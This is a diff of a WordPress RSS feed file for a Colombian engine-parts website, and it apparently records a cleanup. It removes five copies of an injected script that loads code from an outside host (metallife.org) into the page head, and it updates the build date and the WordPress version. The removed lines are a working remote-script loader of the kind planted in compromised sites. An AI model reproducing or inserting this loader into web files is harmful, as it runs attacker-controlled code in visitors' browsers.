@@ -1,33 +1,3 @@
-<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-<script>
-var khutmhpx = document.createElement("script");
-khutmhpx.src = "https://metallife.org/mGRLxkdy";
-document.getElementsByTagName("head")[0].appendChild(khutmhpx);
-</script>
-<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-<script>
-var khutmhpx = document.createElement("script");
-khutmhpx.src = "https://metallife.org/mGRLxkdy";
-document.getElementsByTagName("head")[0].appendChild(khutmhpx);
-</script>
-<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-<script>
-var khutmhpx = document.createElement("script");
-khutmhpx.src = "https://metallife.org/mGRLxkdy";
-document.getElementsByTagName("head")[0].appendChild(khutmhpx);
-</script>
-<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-<script>
-var khutmhpx = document.createElement("script");
-khutmhpx.src = "https://metallife.org/mGRLxkdy";
-document.getElementsByTagName("head")[0].appendChild(khutmhpx);
-</script>
-<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-<script>
-var khutmhpx = document.createElement("script");
-khutmhpx.src = "https://metallife.org/mGRLxkdy";
-document.getElementsByTagName("head")[0].appendChild(khutmhpx);
-</script>
 <?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
@@ -41,11 +11,11 @@ document.getElementsByTagName("head")[0].appendChild(khutmhpx);
 	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
 	<link>./../../index.html</link>
 	<description>Repuestos para motores en Colombia</description>
-	<lastBuildDate>Sun, 22 Oct 2023 07:59:03 +0000</lastBuildDate>
+	<lastBuildDate>Tue, 28 Nov 2023 14:19:03 +0000</lastBuildDate>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=6.2.3</generator>
+	<generator>https://wordpress.org/?v=6.4.1</generator>
 </channel>
 </rss>
